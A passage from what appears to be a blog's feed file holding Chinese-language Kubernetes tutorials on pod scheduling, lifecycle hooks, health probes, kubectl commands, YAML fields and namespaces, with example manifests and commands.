title="调度约束方法"></a>调度约束方法</h3><ul><li>nodeName 用于将pod调度到指定的node名称上</li><li>nodeSelector 用于将pod调度到匹配Label的node上</li></ul><p><strong>第一种</strong>：spec.nodeName 将容器调度到指定节点上</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>root@k8s-master1 ~<span class="token punctuation">]</span><span class="token comment"># vim pod-nodename.yml</span>apiVersion: v1kind: Podmetadata:  name: pod-nodenamespec:  nodeName: k8s-worker1                    <span class="token comment"># 通过nodeName调度到k8s-worker1节点</span>  containers:  - name: nginx    image: nginx:1.15-alpine<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p><strong>第二种</strong>：spec.nodeSelector nodeSelector节点选择器调度到指定节点上去</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>root@k8s-master1 ~<span class="token punctuation">]</span><span class="token comment"># vim pod-nodeselector.yml</span>apiVersion: v1kind: Podmetadata:  name: pod-nodeselectspec:  nodeSelector:                         <span class="token comment"># nodeSelector节点选择器</span>    bussiness: game                     <span class="token comment"># 指定调度到标签为bussiness=game的节点</span>  containers:  - name: nginx    image: nginx:1.15-alpine<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><h2 id="生命周期"><a href="#生命周期" class="headerlink" title="生命周期"></a>生命周期</h2><h3 id="pod生命周期"><a href="#pod生命周期" class="headerlink" title="pod生命周期"></a>pod生命周期</h3><ul><li>有些pod(比如运行httpd服务),正常情况下会一直运行中,但如果手动删除它,此pod会终止</li><li>也有些pod(比如执行计算任务)，任务计算完后就会自动终止</li></ul><p>上面两种场景中,pod从创建到终止的过程就是pod的生命周期。</p><h4 id="容器启动"><a href="#容器启动" class="headerlink" title="容器启动"></a>容器启动</h4><p>启动后钩子<code>post-start</code>执行后执行做<strong>健康检查</strong></p><ul><li><p>第一个健康检查叫存活状态检查(<code>liveness probe</code> )，用来检查主容器<strong>存活状态</strong>的</p></li><li><p>第二个健康检查叫准备就绪检查(<code>readiness probe</code>)，用来检查主容器是否<strong>启动就绪</strong></p></li></ul><h4 id="容器重启策略"><a href="#容器重启策略" class="headerlink" title="容器重启策略"></a>容器重启策略</h4><ul><li><p><strong>Always</strong>：表示容器挂了总是重启，这是默认策略 </p></li><li><p><strong>OnFailures</strong>：表示容器状态为错误时才重启，也就是容器正常终止时不重启 </p></li><li><p><strong>Never</strong>：表示容器挂了不予重启 </p></li><li><p>对于Always这种策略，容器只要挂了，就会立即重启，这样是很耗费资源的。所以Always重启策略是这么做的：第一次容器挂了立即重启，如果再挂了就要延时10s重启，第三次挂了就等20s重启…… 依次类推</p></li></ul><h3 id="HealthCheck健康检查"><a href="#HealthCheck健康检查" class="headerlink" title="HealthCheck健康检查"></a>HealthCheck健康检查</h3><p>当Pod启动时，容器可能会因为某种错误(服务未启动或端口不正确)而无法访问等。</p><table><thead><tr><th>方式</th><th>说明</th></tr></thead><tbody><tr><td>Liveness Probe(存活状态探测)</td><td>指示容器是否正在运行。如果存活态探测失败，则 kubelet 会杀死容器， 并且容器将根据其<a href="https://kubernetes.io/zh/docs/concepts/workloads/pods/pod-lifecycle/#restart-policy">重启策略</a>决定未来。如果容器不提供存活探针， 则默认状态为 <code>Success</code>。</td></tr><tr><td>readiness Probe(就绪型探测)</td><td>指示容器是否准备好为请求提供服务。如果就绪态探测失败， 端点控制器将从与 Pod 匹配的所有服务的端点列表中删除该 Pod 的 IP 地址。 初始延迟之前的就绪态的状态值默认为 <code>Failure</code>。 如果容器不提供就绪态探针，则默认状态为 <code>Success</code>。注：检查后不健康，将容器设置为Notready;如果使用service来访问,流量不会转发给此种状态的pod</td></tr><tr><td>startup Probe</td><td>指示容器中的应用是否已经启动。如果提供了启动探针，则所有其他探针都会被 禁用，直到此探针成功为止。如果启动探测失败，<code>kubelet</code> 将杀死容器，而容器依其 <a href="https://kubernetes.io/zh/docs/concepts/workloads/pods/pod-lifecycle/#restart-policy">重启策略</a>进行重启。 如果容器没有提供启动探测，则默认状态为 <code>Success</code>。</td></tr></tbody></table><h4 id="Probe探测方式"><a href="#Probe探测方式" class="headerlink" title="Probe探测方式"></a>Probe探测方式</h4><table><thead><tr><th>方式</th><th>说明</th></tr></thead><tbody><tr><td>Exec</td><td>执行命令</td></tr><tr><td>HTTPGet</td><td>http请求某一个URL路径</td></tr><tr><td>TCP</td><td>tcp连接某一个端口</td></tr><tr><td>gRPC</td><td>使用 <a href="https://grpc.io/">gRPC</a> 执行一个远程过程调用。 目标应该实现 <a href="https://grpc.io/grpc/core/md_doc_health-checking.html">gRPC健康检查</a>。 如果响应的状态是 “SERVING”，则认为诊断成功。 gRPC 探针是一个 alpha 特性，只有在你启用了 “GRPCContainerProbe” <a href="https://kubernetes.io/zh/docs/reference/command-line-tools-reference/feature-gate/">特性门控</a>时才能使用。</td></tr></tbody></table><h4 id="liveness-exec案例"><a href="#liveness-exec案例" class="headerlink" title="liveness-exec案例"></a>liveness-exec案例</h4><p>1、准备资源清单文件pod-liveness-exec.yml</p><figure><div class="code-wrapper"><pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml"><span class="token key atrule">apiVersion</span><span class="token punctuation">:</span> v1<span class="token key atrule">kind</span><span class="token punctuation">:</span> Pod<span class="token key atrule">metadata</span><span class="token punctuation">:</span>  <span class="token key atrule">name</span><span class="token punctuation">:</span> liveness<span class="token punctuation">-</span>exec  <span class="token key atrule">namespace</span><span class="token punctuation">:</span> default<span class="token key atrule">spec</span><span class="token punctuation">:</span>  <span class="token key atrule">containers</span><span class="token punctuation">:</span>  <span class="token punctuation">-</span> <span class="token key atrule">name</span><span class="token punctuation">:</span> liveness    <span class="token key atrule">image</span><span class="token punctuation">:</span> busybox    <span class="token key atrule">imagePullPolicy</span><span class="token punctuation">:</span> IfNotPresent    <span class="token key atrule">args</span><span class="token punctuation">:</span>    <span class="token punctuation">-</span> /bin/sh    <span class="token punctuation">-</span> <span class="token punctuation">-</span>c    <span class="token punctuation">-</span> touch /tmp/healthy; sleep 30; rm <span class="token punctuation">-</span>rf /tmp/healthy; sleep 600    <span class="token key atrule">livenessProbe</span><span class="token punctuation">:</span>      <span class="token key atrule">exec</span><span class="token punctuation">:</span>        <span class="token key atrule">command</span><span class="token punctuation">:</span>        <span class="token punctuation">-</span> cat        <span class="token punctuation">-</span> /tmp/healthy      <span class="token key atrule">initialDelaySeconds</span><span class="token punctuation">:</span> <span class="token number">5</span> <span class="token comment"># pod启动延迟5秒后探测</span>      <span class="token key atrule">periodSeconds</span><span class="token punctuation">:</span> <span class="token number">5</span> <span class="token comment"># 每5秒探测1次</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>2、应用yaml文件</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">kubectl apply <span class="token parameter variable">-f</span> pod-liveness-exec.yml<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></figure><h4 id="liveness-httpget案例"><a href="#liveness-httpget案例" class="headerlink" title="liveness-httpget案例"></a>liveness-httpget案例</h4><p>1、准备资源清单文件pod-liveness-httpget.yml</p><figure><div class="code-wrapper"><pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml"><span class="token key atrule">apiVersion</span><span class="token punctuation">:</span> v1<span class="token key atrule">kind</span><span class="token punctuation">:</span> Pod<span class="token key atrule">metadata</span><span class="token punctuation">:</span>  <span class="token key atrule">name</span><span class="token punctuation">:</span> liveness<span class="token punctuation">-</span>httpget  <span class="token key atrule">namespace</span><span class="token punctuation">:</span> default<span class="token key atrule">spec</span><span class="token punctuation">:</span>  <span class="token key atrule">containers</span><span class="token punctuation">:</span>  <span class="token punctuation">-</span> <span class="token key atrule">name</span><span class="token punctuation">:</span> liveness    <span class="token key atrule">image</span><span class="token punctuation">:</span> nginx<span class="token punctuation">:</span>1.15<span class="token punctuation">-</span>alpine    <span class="token key atrule">imagePullPolicy</span><span class="token punctuation">:</span> IfNotPresent    <span class="token key atrule">ports</span><span class="token punctuation">:</span>    <span class="token comment"># 指定容器端口，这一段不写也行，端口由镜像决定 </span>    <span class="token punctuation">-</span> <span class="token key atrule">name</span><span class="token punctuation">:</span> http<span class="token comment"># 自定义名称，不需要与下面的port: http对应</span>      <span class="token key atrule">containerPort</span><span class="token punctuation">:</span> <span class="token number">80</span><span class="token comment"># 类似dockerfile里的expose 80</span>    <span class="token key atrule">livenessProbe</span><span class="token punctuation">:</span>      <span class="token key atrule">httpGet</span><span class="token punctuation">:</span>                          <span class="token comment"># 使用httpGet方式</span>        <span class="token key atrule">port</span><span class="token punctuation">:</span> http                      <span class="token comment"># http协议,也可以直接写80端口</span>        <span class="token key atrule">path</span><span class="token punctuation">:</span> /index.html               <span class="token comment"># 探测家目录下的index.html</span>      <span class="token key atrule">initialDelaySeconds</span><span class="token punctuation">:</span> <span class="token number">3</span>            <span class="token comment"># 延迟3秒开始探测</span>      <span class="token key atrule">periodSeconds</span><span class="token punctuation">:</span> <span class="token number">5</span>                  <span class="token comment"># 每隔5s钟探测一次</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>2、应用YAML文件</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">kubectl apply <span class="token parameter variable">-f</span> pod-liveness-httpget.yml<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></figure><h4 id="liveness-tcp案例"><a href="#liveness-tcp案例" class="headerlink" title="liveness-tcp案例"></a>liveness-tcp案例</h4><p>1、准备资源文件pod-liveness-tcp.yml</p><figure><div class="code-wrapper"><pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml"><span class="token key atrule">apiVersion</span><span class="token punctuation">:</span> v1<span class="token key atrule">kind</span><span class="token punctuation">:</span> Pod<span class="token key atrule">metadata</span><span class="token punctuation">:</span>  <span class="token key atrule">name</span><span class="token punctuation">:</span> liveness<span class="token punctuation">-</span>tcp  <span class="token key atrule">namespace</span><span class="token punctuation">:</span> default<span class="token key atrule">spec</span><span class="token punctuation">:</span>  <span class="token key atrule">containers</span><span class="token punctuation">:</span>  <span class="token punctuation">-</span> <span class="token key atrule">name</span><span class="token punctuation">:</span> liveness    <span class="token key atrule">image</span><span class="token punctuation">:</span> nginx<span class="token punctuation">:</span>1.15<span class="token punctuation">-</span>alpine    <span class="token key atrule">imagePullPolicy</span><span class="token punctuation">:</span> IfNotPresent    <span class="token key atrule">ports</span><span class="token punctuation">:</span>    <span class="token punctuation">-</span> <span class="token key atrule">name</span><span class="token punctuation">:</span> http      <span class="token key atrule">containerPort</span><span class="token punctuation">:</span> <span class="token number">80</span>    <span class="token key atrule">livenessProbe</span><span class="token punctuation">:</span>      <span class="token key atrule">tcpSocket</span><span class="token punctuation">:</span>                        <span class="token comment"># 使用tcp连接方式</span>        <span class="token key atrule">port</span><span class="token punctuation">:</span> <span class="token number">80</span>                        <span class="token comment"># 连接80端口进行探测</span>      <span class="token key atrule">initialDelaySeconds</span><span class="token punctuation">:</span> <span class="token number">3</span>      <span class="token key atrule">periodSeconds</span><span class="token punctuation">:</span> <span class="token number">5</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>2、应用YAML文件</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">kubectl apply <span class="token parameter variable">-f</span> pod-liveness-tcp.yml<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></figure><h4 id="readiness案例"><a href="#readiness案例" class="headerlink" title="readiness案例"></a>readiness案例</h4><p>1、准备资源配置文件pod-readiness-httpget.yml</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>root@k8s-master1 ~<span class="token punctuation">]</span><span class="token comment"># vim pod-readiness-httpget.yml</span>apiVersion: v1kind: Podmetadata:  name: readiness-httpget  namespace: defaultspec:  containers:  - name: readiness    image: nginx:1.15-alpine    imagePullPolicy: IfNotPresent    ports:    - name: http      containerPort: <span class="token number">80</span>    readinessProbe:                     <span class="token comment"># 这里由liveness换成了readiness</span>      httpGet:        port: http        path: /index.html      initialDelaySeconds: <span class="token number">3</span>      periodSeconds: <span class="token number">5</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>2、应用YAML文件</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">kubectl apply <span class="token parameter variable">-f</span> pod-readiness-httpget.yml<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></figure><h3 id="post-start"><a href="#post-start" class="headerlink" title="post-start"></a>post-start</h3><blockquote><p>容器启动后执行的命令</p></blockquote><p>1、准备资源清单文件pod-poststart.yml</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">apiVersion: v1kind: Podmetadata:  name: poststart  namespace: defaultspec:  containers:  - name: poststart    image: nginx:1.15-alpine    imagePullPolicy: IfNotPresent    lifecycle:                                       <span class="token comment"># 生命周期事件</span>      postStart:        exec:          command: <span class="token punctuation">[</span><span class="token string">"mkdir"</span>,<span class="token string">"-p"</span>,<span class="token string">"/usr/share/nginx/html/haha"</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>2、应用资源文件</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">kubectl apply <span class="token parameter variable">-f</span> pod-poststart.yml<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></figure><p>3、查看是否创建成功</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">kubectl <span class="token builtin class-name">exec</span> <span class="token parameter variable">-it</span> poststart -- <span class="token function">ls</span> /usr/share/nginx/html <span class="token parameter variable">-l</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></figure><h3 id="pre-stop"><a href="#pre-stop" class="headerlink" title="pre-stop"></a>pre-stop</h3><blockquote><p>容器终止前执行的命令</p></blockquote><p>1、准备资源清单文件prestop.yml</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">apiVersion: v1kind: Podmetadata:  name: prestop  namespace: defaultspec:  containers:  - name: prestop    image: nginx:1.15-alpine    imagePullPolicy: IfNotPresent    lifecycle:                                       <span class="token comment"># 生命周期事件</span>      preStop:                                       <span class="token comment"># preStop</span>        exec:          command: <span class="token punctuation">[</span><span class="token string">"/bin/sh"</span>,<span class="token string">"-c"</span>,<span class="token string">"sleep 60000000"</span><span class="token punctuation">]</span>     <span class="token comment"># 容器终止前sleep 60000000秒</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>2、应用资源文件</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">kubectl apply <span class="token parameter variable">-f</span> prestop.yml<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></figure><p>3、删除验证</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">kubectl delete <span class="token parameter variable">-f</span> prestop.yml<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Kubernetes(二)-快速使用与核心概念</title>
    <link href="/posts/a292d032.html"/>
    <url>/posts/a292d032.html</url>
    
    <content type="html"><![CDATA[<p> kubectl基础操作、node管理、以及核心概念NameSpace、Pod、Controller、Service</p><span id="more"></span><h1 id="kubectl"><a href="#kubectl" class="headerlink" title="kubectl"></a>kubectl</h1><h2 id="kubectl使用帮助"><a href="#kubectl使用帮助" class="headerlink" title="kubectl使用帮助"></a>kubectl使用帮助</h2><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">kubectl <span class="token parameter variable">-h</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></figure><h2 id="kubectl命令说明"><a href="#kubectl命令说明" class="headerlink" title="kubectl命令说明"></a>kubectl命令说明</h2><p><img src="http://file.hyqup.cn/img/image-20230621172951828.png" alt="image-20230621172951828"></p><p><img src="http://file.hyqup.cn/img/image-20230621173005878.png" alt="image-20230621173005878"></p><h2 id="kubectl命令补全"><a href="#kubectl命令补全" class="headerlink" title="kubectl命令补全"></a>kubectl命令补全</h2><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">yum <span class="token function">install</span> <span class="token parameter variable">-y</span> bash-completion<span class="token builtin class-name">source</span> /usr/share/bash-completion/bash_completion<span class="token builtin class-name">source</span> <span class="token operator">&lt;</span><span class="token punctuation">(</span>kubectl completion <span class="token function">bash</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></div></figure><h1 id="node相关命令"><a href="#node相关命令" class="headerlink" title="node相关命令"></a>node相关命令</h1><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#查看集群信息</span>kubectl cluster-info<span class="token comment">#查看集群节点信息</span>kubectl get nodes<span class="token comment">#集群节点信息</span>kubectl get nodes <span class="token parameter variable">-o</span> wide<span class="token comment">#查看节点描述详细信息</span>kubectl describe <span class="token function">node</span> xxx<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p><strong>给节点打标签</strong> lable</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#设置节点标签,标签以key val的形式</span>kubectl label <span class="token function">node</span> xxx  <span class="token assign-left variable">key</span><span class="token operator">=</span>val<span class="token comment">#查看所有节点标签</span>kubectl get <span class="token function">node</span> --show-labels<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></div></figure><h1 id="声明式文件yaml"><a href="#声明式文件yaml" class="headerlink" title="声明式文件yaml"></a>声明式文件yaml</h1><table><thead><tr><th>参数名</th><th>字段类型</th><th>说明</th></tr></thead><tbody><tr><td>version</td><td>String</td><td>这里是指的是K8S API的版本，目前基本上是v1，可以用 kubectl api-versions命令查询</td></tr><tr><td>kind</td><td>String</td><td>这里指的是yam文件定义的资源类型和角色，比如:Pod</td></tr><tr><td>metadata</td><td>Object</td><td>元数据对象，固定值就写 metadata</td></tr><tr><td>metadata.name</td><td>String</td><td>元数据对象的名字，这里由我们编写，比如命名Pod的名字</td></tr><tr><td>metadata.namespace</td><td>String</td><td>元数据对象的命名空间，由我们自身定义</td></tr><tr><td>Spec</td><td>Object</td><td>详细定义对象，固定值就写Spec</td></tr><tr><td>spec. containers[]</td><td>list</td><td>这里是Spec对象的容器列表定义，是个列表</td></tr><tr><td>spec containers [].name</td><td>String</td><td>这里定义容器的名字</td></tr><tr><td>spec.containers [].image</td><td>String</td><td>这里定义要用到的镜像名称</td></tr><tr><td>spec.containers [].imagePullPolicy</td><td>String</td><td>定义镜像拉取策路，有 Always、 Never、Ifnotpresent三个值可选：(1) Always:意思是每次都尝试重新拉取镜像；(2) Never:表示仅使用本地镜像；(3) IfNotPresent:如果本地有镜像就使用本地镜像，没有就拉取在线镜像。上面三个值都没设置的话，默认是 Always。</td></tr><tr><td>spec containers [].command[]</td><td>List</td><td>指定容器启动命令，因为是数组可以指定多个。不指定则使用镜像打包时使用的启动命令。</td></tr><tr><td>spec.containers [].args</td><td>List</td><td>指定容器启动命令参数，因为是数组可以指定多个.</td></tr><tr><td>spec.containers [].workDir</td><td>String</td><td>指定容器的工作目录</td></tr><tr><td>spec.containers[]. volumeMounts[]</td><td>List</td><td>指定容器内部的存储卷配置</td></tr><tr><td>spec.containers[]. volumeMounts[].name</td><td>String</td><td>指定可以被容器挂载的存储卷的名称</td></tr><tr><td>spec.containers[]. volumeMounts[].mountPath</td><td>String</td><td>指定可以被容器挂载的存储卷的路径</td></tr><tr><td>spec.containers[]. volumeMounts[].readOnly</td><td>String</td><td>设置存储卷路径的读写模式，ture或者 false，默认为读写模式</td></tr><tr><td>spec.containers [].ports[]</td><td>String</td><td>指容器需要用到的端口列表</td></tr><tr><td>spec.containers [].ports[].name</td><td>String</td><td>指定端口名称</td></tr><tr><td>spec.containers [].ports[].containerPort</td><td>String</td><td>指定容器需要监听的端口号</td></tr><tr><td>spec.containers [].ports[].hostPort</td><td>String</td><td>指定容器所在主机需要监听的端口号，默认跟上面 containerPort相同，注意设置了 hostPort同一台主机无法启动该容器的相同副本(因为主机的端口号不能相同，这样会冲突)</td></tr><tr><td>spec.containers [].ports[].protocol</td><td>String</td><td>指定端口协议，支持TCP和UDP，默认值为TCP</td></tr><tr><td>spec.containers [].env[]</td><td>List</td><td>指定容器运行前需设的环境变量列表</td></tr><tr><td>spec.containers [].env[].name</td><td>String</td><td>指定环境变量名称</td></tr><tr><td>spec.containers [].env[].value</td><td>String</td><td>指定环境变量值</td></tr><tr><td>spec.containers[].resources</td><td>Object</td><td>指定资源 限制和资源请求的值（这里开始就是设置容器的资源上限）</td></tr><tr><td>spec.containers[].resources.limits</td><td>Object</td><td>指定设置容器运行时资源的运行上限</td></tr><tr><td>spec.containers[].resources.limits.cpu</td><td>String</td><td>指定CPU限制，单位为core数，将用于docker run – cpu-shares参数</td></tr><tr><td>spec.containers[].resources.limits.memory</td><td>String</td><td>指定MEM内存的限制，单位为MiB、GiB</td></tr><tr><td>spec.containers[].resources.requests</td><td>Object</td><td>指定容器启动和调度时的限制设置</td></tr><tr><td>spec.containers[].resources.requests.cpu</td><td>String</td><td>CPU请求，单位为core数，容器启动时初始化可用数量</td></tr><tr><td>spec.containers[].resources.requests.memory</td><td>String</td><td>内存请求，单位为MiB、GiB，容器启动时初始化可用数量</td></tr><tr><td>sepc.restartPolicy</td><td>String</td><td>定义Pod的重启策略，可选值为Always、OnFailure,默认值为Always。1.Always:Pod一旦终止运行，则无论容器时如何终止的，kubelet服务都将重启它。2.OnFailure:只有Pod以非零退出码终止时，kubelet才会重启该容器。如果容器正常结束（退出码为0），则kubelet将不会重启它。3.Never:Pod终止后，kubelet将退出码报告给Master,不会重启该Pod。</td></tr><tr><td>spec.nodeSelector</td><td>Object</td><td>定义Node的Label过滤标签，以key:value格式指定。</td></tr><tr><td>spec.imagePullSecrets</td><td>Object</td><td>定义pull镜像时使用secret名称，以name:secretkey格式指定。</td></tr><tr><td>spec.hostNetwork</td><td>Boolean</td><td>定义是否使用主机网络模式，默认值为false。设置true表示使用宿主机网络，不使用docker网桥，同时设置了true将无法在同一台宿主机上启动第二个副本。</td></tr></tbody></table><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#查看子段的配置说明</span>kubectl explain xxx<span class="token comment">#eg:kubectl explain metadata</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></div></figure><h2 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h2><h3 id="创建Namespace"><a href="#创建Namespace" class="headerlink" title="创建Namespace"></a>创建Namespace</h3><figure><div class="code-wrapper"><pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml"><span class="token key atrule">apiVersion</span><span class="token punctuation">:</span> v1<span class="token key atrule">kind</span><span class="token punctuation">:</span> Namespace<span class="token key atrule">metadata</span><span class="token punctuation">:</span>  <span class="token key atrule">name</span><span class="token punctuation">:</span> test<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></div></figure><h3 id="创建pod"><a href="#创建pod" class="headerlink" title="创建pod"></a>创建pod</h3><figure><div class="code-wrapper"><pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml"><span class="token key atrule">apiVersion</span><span class="token punctuation">:</span> v1<span class="token key atrule">kind</span><span class="token punctuation">:</span> Pod<span class="token key atrule">metadata</span><span class="token punctuation">:</span>  <span class="token key atrule">name</span><span class="token punctuation">:</span> pod<span class="token key atrule">spec</span><span class="token punctuation">:</span>  <span class="token key atrule">containers</span><span class="token punctuation">:</span>  <span class="token punctuation">-</span> <span class="token key atrule">name</span><span class="token punctuation">:</span> nginx    <span class="token key atrule">image</span><span class="token punctuation">:</span> nginx<span class="token punctuation">:</span>latest    <span class="token key atrule">imagePullPolicy</span><span class="token punctuation">:</span> IfNotPresent<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><h1 id="集群命名空间-Namespace"><a href="#集群命名空间-Namespace" class="headerlink" title="集群命名空间-Namespace"></a>集群命名空间-Namespace</h1><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><ul><li>Namespace是对一组资源和对象的抽象集合.</li><li>常见的 pod, service, deployment 等都是属于某一个namespace的（默认是 default）</li><li>不是所有资源都属于namespace，如nodes, persistent volume，namespace 等资源则不属于任何 namespace</li></ul><h2 id="查看"><a href="#查看" class="headerlink" title="查看"></a>查看</h2><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#获取namespace</span>kubectl get namespaces<span class="token comment">#获取一个namespace下面的所有资源</span>kubectl get all <span class="token parameter variable">--namespace</span><span class="token operator">=</span>xx<span class="token comment"># eg: kubectl get pod --namespace=kube-system</span><span class="token comment"># 获取某一种类型,这里xx 可以pod等</span>kubectl get xx <span class="token parameter variable">--namespace</span><span class="token operator">=</span>yyy<span class="token comment"># eg: kubectl get pod --namespace=kube-system</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><h2 id="创建"><a href="#创建" class="headerlink" title="创建"></a>创建</h2><p>命令行</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#命令行创建</span>kubectl create namespace xxx<span class="token comment">#获取namespace</span>kubectl get ns<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>YAML文件创建</p><p>ns.yaml</p><figure><div class="code-wrapper"><pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml"><span class="token key atrule">apiVersion</span><span class="token punctuation">:</span> v1<span class="token comment"># api版本号</span><span class="token key atrule">kind</span><span class="token punctuation">:</span> Namespace<span class="token comment"># 类型为namespace</span><span class="token key atrule">metadata</span><span class="token punctuation">:</span><span class="token comment"># 定义namespace的元数据属性</span>  <span class="token key atrule">name</span><span class="token punctuation">:</span> ns2    <span class="token comment"># 定义name属性为ns2</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></div></figure><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">kubectl apply <span class="token parameter variable">-f</span> ns.yml<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></figure><h1 id="核心概念概述"><a href="#核心概念概述" class="headerlink" title="核心概念概述"></a>核心概念概述</h1><ul><li><strong>Pod</strong>:是可以在 Kubernetes 中创建和管理的、最小的可部署的计算单元</li><li><strong>Controller</strong>:用于管理和运行Pod的对象，控制器通过监控集群的公共状态，并致力于将当前状态转变为期望的状态</li><li><strong>Label</strong>：附着到object上（例如Pod）的键值对。可以在创建object的时候指定，也可以在object创建后随时指定。Labels的值对系统本身并没有什么含义，只是对用户才有意义。</li><li><strong>Service</strong>:将运行在一组 Pods上的应用程序公开为网络服务的抽象方法</li></ul>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Kubernetes(一)-基础介绍与环境搭建</title>
    <link href="/posts/188048a0.html"/>
    <url>/posts/188048a0.html</url>
    
